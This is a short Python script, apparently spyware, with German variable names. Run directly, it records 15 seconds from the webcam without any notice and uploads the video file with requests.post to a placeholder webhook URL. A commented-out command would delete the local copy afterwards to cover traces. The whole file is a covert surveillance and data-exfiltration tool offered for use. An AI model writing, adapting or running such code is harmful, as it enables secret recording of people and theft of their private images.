import imageio
import requests
import time
#import subprocess

def CHEESE():
    aufnahme_dauer = 15
    webcam_index = 0
    cap = imageio.get_reader(f"<video{webcam_index}>", 'ffmpeg')
    fps = 200
    output_datei = 'video.mp4'
    writer = imageio.get_writer(output_datei, fps=fps, codec='libx264')
    startzeit = time.time()
    for frame in cap:
        writer.append_data(frame)
        if int(time.time() - startzeit) >= aufnahme_dauer:
            break
    writer.close()
    webhook_url = "YOUR WEBHOOK HERE"
    dateipfad = 'video.mp4'
    with open(dateipfad, 'rb') as f:
        dateiinhalt = f.read()
    payload = {
        'file': ('video.mp4', dateiinhalt)
    }
    response = requests.post(webhook_url, files=payload)
    #subprocess.run("del video.mp4", shell=True)
CHEESE()
